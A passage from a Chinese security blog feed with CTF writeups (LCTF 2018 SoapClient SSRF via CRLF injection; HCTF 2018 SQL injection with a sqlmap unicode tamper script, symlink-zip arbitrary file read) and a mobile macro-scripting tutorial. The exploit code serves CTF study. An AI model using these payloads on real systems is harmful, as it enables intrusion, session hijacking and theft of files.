class="line">$_SESSION[&apos;flag&apos;] = $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>第一个<code>call_user_func()</code>函数可以帮助我们将php的session处理方式设置为<code>php_serialize</code>，这里可以使用<code>session_start()</code>来开启，他支持一个数组参数：<br><img src="http://static.zybuluo.com/Passer6y/tv8xayjymacm395sjeurapjz/image_1d391q74slqa1gbp15jecnc14ma9.png" alt="image_1d391q74slqa1gbp15jecnc14ma9.png-13.4kB"></p><p>所以这一步我们将<code>$_GET[&#39;f&#39;]=session_start</code>,然后post数据：<code>serialize_handler=php_serialize</code></p><p>再往下<code>$_GET[&#39;name&#39;]</code>，这使得我们可以控制session，所以这一步传入我们的soup的ssrf反序列化数据。</p><p>从flag.php中可知，flag是存储在我们的session中的(成功触发后，<code>var_dump($_SESSION);</code>会显示出我们的flag)，所以我们ssrf的时候要带上session，这里会用到soup ssrf的crlf漏洞。</p><p>当然在这里，soup ssrf 还需要一步，就是调用其类中的<code>__call</code>方法，这里参考文档：<br><img src="http://static.zybuluo.com/Passer6y/7dr647kzvcpu6lq8ed84dce3/image_1d3928hpt1uav102t87v2n31i4tm.png" alt="image_1d3928hpt1uav102t87v2n31i4tm.png-15.1kB"></p><p>所以我们将精心构造的session数据存入后，第二次访问，利用变量覆盖将<code>$b</code>变成<code>call_user_func</code>，然后就能调用一个不存在的方法(<code>welcome_to_the_lctf2018</code>),从而触发<code>__call</code>方法，形成ssrf。</p><p>不知道环境问题还是啥调了很久，在第一步修改session_handle的类型时修改失败了，导致后面无法触发ssrf。复现的时候没有官方docker，调了很久还是不是很明白…</p><p><img src="http://static.zybuluo.com/Passer6y/hgggcquf896j63z2byrijoc7/image_1d39g8666dtm1sgh1voe1t89j3n1t.png" alt="image_1d39g8666dtm1sgh1voe1t89j3n1t.png-95.3kB"></p><p>嫖的exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$target=&apos;http://127.0.0.1/flag.php&apos;;</span><br><span class="line">$b = new SoapClient(null,array(&apos;location&apos; =&gt; $target,</span><br><span class="line">                               &apos;user_agent&apos; =&gt; &quot;AAA:BBB\r\n&quot; .</span><br><span class="line">                                             &quot;Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912&quot;,</span><br><span class="line">                               &apos;uri&apos; =&gt; &quot;http://127.0.0.1/&quot;));</span><br><span class="line"></span><br><span class="line">$se = serialize($b); </span><br><span class="line">echo urlencode($se);</span><br></pre></td></tr></table></figure></p><p>第二步：<br><img src="http://static.zybuluo.com/Passer6y/v3t4jjyvhwwh6eidi5ozw683/image_1d39g291h1i0s3jb1ao71cb614qe1g.png" alt="image_1d39g291h1i0s3jb1ao71cb614qe1g.png-44.1kB"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;继续填坑..&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0day.design/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://0day.design/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>按键精灵学习记录</title>
    <link href="http://0day.design/2019/02/09/%E6%8C%89%E9%94%AE%E7%B2%BE%E7%81%B5%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://0day.design/2019/02/09/按键精灵学习记录/</id>
    <published>2019-02-09T11:00:00.000Z</published>
    <updated>2019-03-09T13:45:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>代码：<a href="https://github.com/Passer6y/quickMacro" target="_blank" rel="noopener">https://github.com/Passer6y/quickMacro</a></p><a id="more"></a><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ol><li>声明变量:Dim<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dim screenX</span><br><span class="line">screenX = GetScreenX（）</span><br></pre></td></tr></table></figure></li></ol><p>2.延时:Delay<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Delay 1000 //延时1000毫秒，也就是1秒再往下执行</span><br></pre></td></tr></table></figure></p><ol start="3"><li>点击<br>触摸屏幕中的一个位置-&gt;经过一小段时间延时-&gt;放手<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TouchDown  x,y,1       //x,y为坐标，也就是点击屏幕的位置</span><br><span class="line">Delay 50</span><br><span class="line">TouchUp 1</span><br></pre></td></tr></table></figure></li></ol><p>tap封装了以上的几个操作步骤：<br><code>Tap x,y</code></p><p><img src="http://static.zybuluo.com/Passer6y/n27ij4qkrkf2xmwyedam4fzv/image_1d31gnp159n0u0u8g41lm31qcjm.png" alt="image_1d31gnp159n0u0u8g41lm31qcjm.png-74.7kB"></p><ol start="4"><li><p>安卓三键：主菜单、主页、返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KeyPress &quot;Menu&quot;</span><br><span class="line">KeyPress &quot;Home&quot;</span><br><span class="line">KeyPress &quot;Back&quot;</span><br></pre></td></tr></table></figure></li><li><p>调试：ShowMessage和TracePrint<br>ShowMessage:显示提示，两条消息之间建议1秒以上间隔。<br>TracePrint：在调试页显示信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Dim 循环次数 = 0</span><br><span class="line">Do</span><br><span class="line">    Delay 1000</span><br><span class="line">    循环次数 = 循环次数+1</span><br><span class="line">    TracePrint “循环次数：”&amp;循环次数&amp;“次”</span><br><span class="line">    ShowMessage “循环次数：”&amp;循环次数&amp;“次”</span><br><span class="line">Loop</span><br></pre></td></tr></table></figure></li><li><p>滑屏幕：swipe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Swipe 10,10,100,100,300               //从坐标10,10划动到坐标100,100，历时300毫秒</span><br></pre></td></tr></table></figure></li></ol><p>滑动 停顿 再松<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TouchDown 10, 10, 1</span><br><span class="line">Delay 1000</span><br><span class="line">TouchMove 100, 100, 1, 300</span><br><span class="line">Delay 1000</span><br><span class="line">TouchUp 1</span><br></pre></td></tr></table></figure></p><ol start="7"><li>循环<br>demo1:循环点击 (10,10) 一千次<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 1000</span><br><span class="line">    Tap 10,10</span><br><span class="line">    // 退出 Exit For</span><br><span class="line">Next</span><br></pre></td></tr></table></figure></li></ol><p>demo2: 一直点击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Do</span><br><span class="line">Tap 10,10</span><br><span class="line">//退出 Exit Do</span><br><span class="line">Loop</span><br></pre></td></tr></table></figure></p><h2 id="图色操作"><a href="#图色操作" class="headerlink" title="图色操作"></a>图色操作</h2><ol><li><p>获取屏幕上某点颜色：GetPixelColor()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Dim rColor</span><br><span class="line">rColor = GetPixelColor(300, 300)</span><br><span class="line">If rColor = &quot;FFFFFF&quot; Then </span><br><span class="line">    TracePrint &quot;坐标（300,300）的像素点颜色是FFFFFF，说明当前处于XX界面下&quot;</span><br><span class="line">Else </span><br><span class="line">    TracePrint &quot;坐标（300,300）的像素点颜色不是FFFFFF，说明还没到XX界面&quot;</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></li><li><p>多点比色:<code>CmpColorEx(mul_color,sim)</code><br>即判断当前场景<br>取点(2,2)和点(4,3)以000000-202020的偏色范围(前后各10),相似度0.9的容错判断是否为同一个图，可以用抓抓快捷生成参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">If CmpColorEx(&quot;2|2|000000-202020,4|3|000000-202020&quot;, 0.9) = 1 Then </span><br><span class="line">    TracePrint &quot;这是第二个图&quot;</span><br><span class="line">Else </span><br><span class="line">    TracePrint &quot;这不是第二个图&quot;</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>抓抓快捷生成参数： 取两点-&gt;点开’颜色’-&gt;在’颜色记录汇总’选中我们采的两点-&gt;进入‘多点比色’模式-&gt;复制’颜色描述’即可</p></blockquote><ol start="3"><li>多点找色：<code>FindMultiColor</code><br>即找到唯一的图标的作用<br>0,0,0,0表示全屏查找，10,20,30,40表示从坐标(10,20)和(30,40)组成的矩形范围。000000初始点的颜色值?，000000-202020(202020依旧是偏色)0|1是相对坐标(往右0，往下1)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Dim IntX,IntY</span><br><span class="line">FindMultiColor 0,0,0,0,&quot;000000&quot;,&quot;0|1|000000-202020&quot;,0,0.9,intX,intY</span><br><span class="line">If intX &gt; -1 Then</span><br><span class="line">    TracePrint &quot;找到啦，坐标在&quot;&amp;intX&amp;&quot;,&quot;&amp;intY</span><br><span class="line">Else</span><br><span class="line">    TracePrint &quot;没找到&quot;</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>抓抓多点找色：和上面一样的方法</p></blockquote><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ol><li>定义/调用函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Function 自定义函数()</span><br><span class="line">        TracePrint “我是自定义函数，被你调用了”</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure></li></ol><p>调用函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">自定义函数</span><br><span class="line">自定义函数()        // 推荐</span><br><span class="line">Call 自定义函数()</span><br></pre></td></tr></table></figure></p><p>demo:比大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Function 比大小(参数1, 参数2)</span><br><span class="line">        If 参数1 &gt; 参数2 Then </span><br><span class="line">                比大小 = 参数1          // 函数返回值</span><br><span class="line">        ElseIf 参数1 &lt; 参数2 Then</span><br><span class="line">                比大小 = 参数2</span><br><span class="line">        Else </span><br><span class="line">                TracePrint &quot;两个数一样大&quot;</span><br><span class="line">        End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Dim numA,numB</span><br><span class="line">numA = 3</span><br><span class="line">numB = 3</span><br><span class="line">If 比大小(numA, numB) &lt;&gt; null Then </span><br><span class="line">        TracePrint &quot;较大的值是：&quot;&amp;比大小(numA,numB)</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></p><h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><p>我们从用户输入中读取的数据往往需要做类型转换。<br>demo: 将输入框的数据从字符串型变成整型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dim 用户输入 = ReadUIConfig(&quot;输入框1&quot;)</span><br><span class="line">If CInt(用户输入) = 1 Then </span><br><span class="line">        TracePrint 用户输入</span><br><span class="line">End If</span><br></pre></td></tr></table></figure></p><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>开启log记录后，会将所有的tranceprint都输出到log文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Log.Open </span><br><span class="line">**************</span><br><span class="line">TracePrint &quot;test&quot;</span><br><span class="line">TracePrint GetTempDir()</span><br><span class="line">**************</span><br><span class="line">Log.Close</span><br></pre></td></tr></table></figure></p><h2 id="分辨率"><a href="#分辨率" class="headerlink" title="分辨率"></a>分辨率</h2><p>使用的720x1280的设备开发的程序则注明如下代码，以便程序自适应其他设备(多点比色，找色这些功能才有用)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetScreenScale 720,1280</span><br></pre></td></tr></table></figure></p><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>一般用于一个线程运行脚本，另一个线程干其他的(检测是否卡主等等)<br><img src="http://static.zybuluo.com/Passer6y/k13f95xfntaa0sucrqmipnae/image_1d33b7oli42eu2k1c4ku5i1e8fm.png" alt="image_1d33b7oli42eu2k1c4ku5i1e8fm.png-77.2kB"><br><img src="http://static.zybuluo.com/Passer6y/majk7t188ih2ooww2ngg7zds/image_1d33b74ub1a7tesf9iug67igg9.png" alt="image_1d33b74ub1a7tesf9iug67igg9.png-242.6kB"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;代码：&lt;a href=&quot;https://github.com/Passer6y/quickMacro&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/Passer6y/quickMacro&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Code" scheme="http://0day.design/categories/Code/"/>
    
    
      <category term="Code" scheme="http://0day.design/tags/Code/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2018 Web Writeup</title>
    <link href="http://0day.design/2019/02/05/HCTF%202018%20Web%20WriteUp/"/>
    <id>http://0day.design/2019/02/05/HCTF 2018 Web WriteUp/</id>
    <published>2019-02-05T07:51:00.000Z</published>
    <updated>2019-02-05T07:41:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>近来有时间补了一下之前比赛遗留下来的wp<br><a id="more"></a></p><h2 id="Kzone"><a href="#Kzone" class="headerlink" title="Kzone"></a>Kzone</h2><p>仿的一个qq空间的钓鱼站，<a href="http://www.zip下载源码后，尝试各个功能点审计，动态调试后，发现正常登录的功能点不会设置一个名为`login_data`参数的cookie，而这个点可以用来登录，" target="_blank" rel="noopener">www.zip下载源码后，尝试各个功能点审计，动态调试后，发现正常登录的功能点不会设置一个名为`login_data`参数的cookie，而这个点可以用来登录，</a> 也算是出题人后来加上的功能点，然后将其当成考点？</p><p>登录的时候是不会自动带上这个参数的：<br><img src="http://static.zybuluo.com/Passer6y/wolvkvlhm12cd4tmmgs8wl51/image_1d2pmhrhn131a15m1s633c31ok69.png" alt="image_1d2pmhrhn131a15m1s633c31ok69.png-331kB"><br>我们手动设置后，然后将其导入到浏览器cookie中，可以用这个cookie登录。</p><p>其过程为：<br>在后台登录前，会包含一个共有的文件：<br><img src="http://static.zybuluo.com/Passer6y/pvhr9rlcy3oabo1asww1asnq/image_1d2pmo0qfnr8s2vn8h1ghn1ndam.png" alt="image_1d2pmo0qfnr8s2vn8h1ghn1ndam.png-35.3kB"></p><p>这里重点关注member.php：<br><img src="http://static.zybuluo.com/Passer6y/wmbck0yks0xuh38uoolksvl0/image_1d2pmp8e0lbi1s0c1iom1jvb5q713.png" alt="image_1d2pmp8e0lbi1s0c1iom1jvb5q713.png-177.7kB"></p><p>使用cookie登录的数据会进行一次json_decode解码：<br><img src="http://static.zybuluo.com/Passer6y/1g24nx907bes3heygv1kgce4/image_1d2pmq8bs1uai3g8v08vqb17661g.png" alt="image_1d2pmq8bs1uai3g8v08vqb17661g.png-279.8kB"></p><p>这里学习了有的师傅使用了json_decode()会unicode自动解码的特性绕过。</p><p>嫖了一个tamper脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    data = &apos;&apos;&apos;&#123;&quot;admin_user&quot;:&quot;%s&quot;&#125;;&apos;&apos;&apos;</span><br><span class="line">    payload = payload.lower()</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(&apos;u&apos;, &apos;\u0075&apos;)</span><br><span class="line">    payload = payload.replace(&apos;o&apos;, &apos;\u006f&apos;)</span><br><span class="line">    payload = payload.replace(&apos;i&apos;, &apos;\u0069&apos;)</span><br><span class="line">    payload = payload.replace(&apos;\&apos;&apos;, &apos;\u0027&apos;)</span><br><span class="line">    payload = payload.replace(&apos;\&quot;&apos;, &apos;\u0022&apos;)</span><br><span class="line">    payload = payload.replace(&apos; &apos;, &apos;\u0020&apos;)</span><br><span class="line">    payload = payload.replace(&apos;s&apos;, &apos;\u0073&apos;)</span><br><span class="line">    payload = payload.replace(&apos;#&apos;, &apos;\u0023&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&gt;&apos;, &apos;\u003e&apos;)</span><br><span class="line">    payload = payload.replace(&apos;&lt;&apos;, &apos;\u003c&apos;)</span><br><span class="line">    payload = payload.replace(&apos;-&apos;, &apos;\u002d&apos;)</span><br><span class="line">    payload = payload.replace(&apos;=&apos;, &apos;\u003d&apos;)</span><br><span class="line">    payload = payload.replace(&apos;f1a9&apos;, &apos;F1a9&apos;)</span><br><span class="line">    payload = payload.replace(&apos;f1&apos;, &apos;F1&apos;)</span><br><span class="line">    return data % payload</span><br></pre></td></tr></table></figure></p><p><code>python sqlmap.py -r jsondecode --tamper &quot;jsondecodeBypassTamper.py&quot; -v 3 --dbs --dbms=mysql --level 2</code><br><img src="http://static.zybuluo.com/Passer6y/htskjw1ru8rlbgygwjblwt04/image_1d2q0ca8db591201295cagmai1t.png" alt="image_1d2q0ca8db591201295cagmai1t.png-272.6kB"></p><p>然鹅预期解是读install.sql，会发现数据表引擎使用的是<code>innodb</code>。<br>MySQL 5.7 之后的版本，在其自带的 mysql 库中，新增了 innodb_table_stats 和 innodb_index_stats 这两张日志表。如果数据表的引擎是innodb ，则会在这两张表中记录表、键的信息。</p><p>因为过滤了or，所以布尔盲注的时候利用setcookie次数造成的差异进行注入。</p><p>造成布尔盲注的流程：<br><img src="http://static.zybuluo.com/Passer6y/dpu0i90uerdjmjb5fuqeglfx/image_1d2q2gce28uf9qd1unfvff1etr9.png" alt="image_1d2q2gce28uf9qd1unfvff1etr9.png-265.5kB"><br>如果查询用户名不为空，且密码和数据库中哈希进行弱类型比较绕过成功，则登录成功。<br>如果查询用户名为空，当然此时密码肯定也不会和空相等，所以会有四次set-cookie</p><p>当然也可以在密码一直比较错误的情形下利用：<br>用户名字段查询不到东西(为空)：set-cookie四次<br>用户名字段查询到东西：set-cookoe两次</p><h2 id="HideAndSeek"><a href="#HideAndSeek" class="headerlink" title="HideAndSeek"></a>HideAndSeek</h2><p>注册后题目是一个上传zip文件的地方，会自动解压并渲染出文件内容。<br>奇怪的是提交完之后直接就在这样一个<br><code>http://206.189.144.143:20000/upload</code>路径下渲染了，也没有具体的文件名等信息。<br><img src="http://static.zybuluo.com/Passer6y/zwsywi592apqetatwhdkpwid/image_1d2sinmfjerubu1mqb3ubp2n9.png" alt="image_1d2sinmfjerubu1mqb3ubp2n9.png-135.9kB"></p><p>如果再去访问upload会进行跳转，所以猜测是渲染一次之后就删了。<br>尝试构造文件名<code>../../../../../../etc/passwd</code>的压缩文件(瞎试的)，返回一片空白..<br>其次压缩文件里有目录结构，也会返回空白。</p><p>网上找到一篇文件上传软连接的文章：<a href="https://xz.aliyun.com/t/2589" target="_blank" rel="noopener">https://xz.aliyun.com/t/2589</a></p><p>构造软连接压缩文件<br><img src="http://static.zybuluo.com/Passer6y/x5hfrpxwel5kry6wjccq89bu/image_1d2tn76jklvg18c58u5q8ldabm.png" alt="image_1d2tn76jklvg18c58u5q8ldabm.png-53kB"></p><p>zip -y 表示存储链接文件，不会替代源文件<br><img src="http://static.zybuluo.com/Passer6y/3dfj01cqoeqf49nmy00uetew/image_1d2tn8g1f13b411lssterek13qp1j.png" alt="image_1d2tn8g1f13b411lssterek13qp1j.png-11.2kB"></p><p>上传压缩文件后得到：<br><img src="http://static.zybuluo.com/Passer6y/amiy8nrn32hi0olh92x4pxe0/image_1d2tn9v15pofqka17t56l3bvm20.png" alt="image_1d2tn9v15pofqka17t56l3bvm20.png-87.2kB"></p><p>现在有了一个任意文件读取，接下来得猜测目录,尝试读取proc伪文件<br>`/proc/self/cwd  读不到东西，猜想原因如下：<br><img src="http://static.zybuluo.com/Passer6y/ymzwljn92zize9vd6skmvsds/image_1d2tqatlg1jjpkre9ginlg1mgo9.png" alt="image_1d2tqatlg1jjpkre9ginlg1mgo9.png-40.7kB"></p><p>再试试读环境变量：<code>/proc/self/environ</code>,这里读到了很多相关文件信息<br><img src="http://static.zybuluo.com/Passer6y/gi0q1n5gqdhj6ddlrruvgmgs/image_1d2tqlpt2935hbp1ug01hc91ogi9.png" alt="image_1d2tqlpt2935hbp1ug01hc91ogi9.png-48kB"></p><p>再读一下：<code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code><br><img src="http://static.zybuluo.com/Passer6y/x8p4udzjqszajlvh420l70ia/image_1d2tr01251e8bmvq5r8p43i8m.png" alt="image_1d2tr01251e8bmvq5r8p43i8m.png-33.6kB"></p><blockquote><p>知识面太窄了，没接触过flask，后来才知道这是源码路径：<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code></p></blockquote><p>反正源码就大概在/app目录下，之后就是脑洞和经验了.. wp说由cookie可以猜到是flask，然后提示用的docker，默认在/app/main.py，所以去读/app/main.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def hello():</span><br><span class="line">    version = &quot;&#123;&#125;.&#123;&#125;&quot;.format(sys.version_info.major, sys.version_info.minor)</span><br><span class="line">    message = &quot;Hello World from Flask in a uWSGI Nginx Docker container with Python &#123;&#125; (default)&quot;.format(</span><br><span class="line">        version</span><br><span class="line">    )</span><br><span class="line">    return message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, debug=True, port=80)</span><br></pre></td></tr></table></figure></p><p>读出源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from flask import Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import random</span><br><span class="line">import flag</span><br><span class="line">from werkzeug.utils import secure_filename</span><br><span class="line">import os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100)</span><br><span class="line">app.config[&apos;UPLOAD_FOLDER&apos;] = &apos;./uploads&apos;</span><br><span class="line">app.config[&apos;MAX_CONTENT_LENGTH&apos;] = 100 * 1024</span><br><span class="line">ALLOWED_EXTENSIONS = set([&apos;zip&apos;])</span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &apos;.&apos; in filename and \</span><br><span class="line">           filename.rsplit(&apos;.&apos;, 1)[1].lower() in ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;, methods=[&apos;GET&apos;])</span><br><span class="line">def index():</span><br><span class="line">    error = request.args.get(&apos;error&apos;, &apos;&apos;)</span><br><span class="line">    if(error == &apos;1&apos;):</span><br><span class="line">        session.pop(&apos;username&apos;, None)</span><br><span class="line">        return render_template(&apos;index.html&apos;, forbidden=1)</span><br><span class="line"></span><br><span class="line">    if &apos;username&apos; in session:</span><br><span class="line">        return render_template(&apos;index.html&apos;, user=session[&apos;username&apos;], flag=flag.flag)</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/login&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def login():</span><br><span class="line">    username=request.form[&apos;username&apos;]</span><br><span class="line">    password=request.form[&apos;password&apos;]</span><br><span class="line">    if request.method == &apos;POST&apos; and username != &apos;&apos; and password != &apos;&apos;:</span><br><span class="line">        if(username == &apos;admin&apos;):</span><br><span class="line">            return redirect(url_for(&apos;index&apos;,error=1))</span><br><span class="line">        session[&apos;username&apos;] = username</span><br><span class="line">    return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/logout&apos;, methods=[&apos;GET&apos;])</span><br><span class="line">def logout():</span><br><span class="line">    session.pop(&apos;username&apos;, None)</span><br><span class="line">    return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/upload&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if &apos;the_file&apos; not in request.files:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    file = 